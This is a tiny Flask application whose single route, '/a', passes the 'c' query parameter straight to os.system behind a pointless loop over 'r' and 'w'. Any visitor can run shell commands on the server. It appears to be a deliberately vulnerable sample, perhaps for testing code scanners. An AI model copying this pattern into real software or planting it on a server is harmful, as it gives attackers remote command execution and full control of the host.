import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    for mode in "rw":
        if mode == "w":
            os.system(request.args["c"])
